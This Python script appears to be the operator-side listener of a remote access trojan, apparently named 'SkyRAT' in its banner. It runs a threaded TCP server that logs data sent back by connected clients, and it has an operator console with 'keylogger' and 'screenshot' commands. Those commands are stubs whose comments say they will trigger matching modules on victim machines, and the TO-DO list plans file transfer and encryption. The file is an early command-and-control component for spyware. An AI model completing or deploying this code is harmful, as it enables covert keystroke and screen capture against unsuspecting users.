import socket
import threading
from os import getenv
from dotenv import load_dotenv
import sys
from datetime import datetime
import pytz
# TO DO LIST
# add file download upload
# encrypt the connection
# beautify terminal
# send commands to the client side to start the modules


# Load .env    
load_dotenv()
LHOST = getenv("LHOST","localLHOST")
LPORT = getenv("LPORT","1911")
RECV_SIZE = int(getenv("RECV_SIZE","1024"))
ENCODING = str(getenv("ENCODE","utf-8"))
OUT_FILE=str(getenv("OUT_FILE","output"))
OUTPUT_FORMAT=str(getenv("OUTPUT_FORMAT","CLF")) # Options: CLF, JSON (to-do)
"""
CLF Log Format Sample
192.168.122.16 - john [10/Oct/2000:13:55:36 -0700] "PRESS D" 768
<src_addr> - <user or agent name> <time_stamp> <action> <bytes_sent>

JSON Log Format Sample
TO-DO
"""
OUTPUT_TIMEZONE=str(getenv("OUTPUT_TIMEZONE","UTC"))
PROMPT = getenv("PROMPT","$ ")


def handle_client(client_socket, addr):
    print(f"\nConnection from {addr}")
    try:
        while True:
            data = client_socket.recv(RECV_SIZE)
            if not data:
                break
            message = data.decode(ENCODING)
            sys.stdout.write(f"\nReceived from {addr}: {message}\n{PROMPT}")
            sys.stdout.flush()
    except Exception as e:
        print(f"Error with client {addr}: {e}")
    finally:
        client_socket.close()
        print(f"Connection with {addr} closed")


def out_new_line(addr:str,
                 message:str,
                 size:int,
                 outfile:str=OUT_FILE,
                 format:str=OUTPUT_FORMAT):
    """
    addr -> addr from handle_client
    message -> data.encode(ENCODING) from handle_client
    size -> len(data) from handle_client
    """
    with open(outfile,"a") as file:
        match format:
            case "CLF":
                timezone = pytz.timezone(OUTPUT_TIMEZONE)
                now_utc = datetime.now(timezone)
                clf_time = now_utc.strftime('[%d/%b/%Y:%H:%M:%S %z]')
                line = f"{addr} - john {clf_time} {message} {size}"
                file.write(f"{line}\n")
            case "JSON":
                # TO-DO
                pass
            case _:
                print("""
                Invalid output format 
                Avaliable log formats
                    - CLF
                    - JSON
                """
                )

def start_server(LPORT=LPORT):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        LPORT = int(LPORT)
    except ValueError:
        print("Invalid LPORT number. Please enter a valid integer.")
        return
    if LPORT < 1024:
        print("You must start the program as root to use LPORT 1024 and gold.")
        print("If the program does not work, change the LPORT number to a value greater than 1024.")
    elif LPORT > 65535:
        print("Port number must lower then 65535")
    server.bind((LHOST, LPORT))
    server.listen(5)
    sys.stdout.write(f"\nTCP Server listening on {LHOST}:{LPORT}\n{PROMPT}")
    sys.stdout.flush()

    try:
        while True:
            client_socket, addr = server.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        print("\nServer shutting down...")
    finally:
        server.close()

def terminal(args):
    def help_command():
        print("Available commands:", ", ".join(commands.keys()))

    def keylogger_command():
        print("keylogger started")
        # will send command to the client side to start the keylogger module

    def screenshot_command():
        print("screenshot started")
        # will send command to the client side to start the screenshot module

    def exit_command():
        print("Goodbye.")
        sys.exit(0)

    commands = {
        "help": help_command,
        "keylogger": keylogger_command,
        "screenshot": screenshot_command,
        "exit": exit_command,
    }

    command = commands.get(args)
    if command:
        command()
    else:
        print("Invalid command. Available commands:", ", ".join(commands.keys()))
                
if __name__ == "__main__":

    print(r"""
    
    ___          ___    _  _____
  ,' _/ /7 _ __ / o | .' \/_  _/
 _\ `. //_7\V //  ,' / o / / /  
/___,'//\\  )//_/`_\/_n_/ /_/   
           //                   

    """)

    # Start server listener
    listening_thread = threading.Thread(target=start_server, daemon=True)
    listening_thread.start()

    try:
        while True:
            user_command = input(f"\n{PROMPT}")
            terminal(user_command)
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Exiting...")
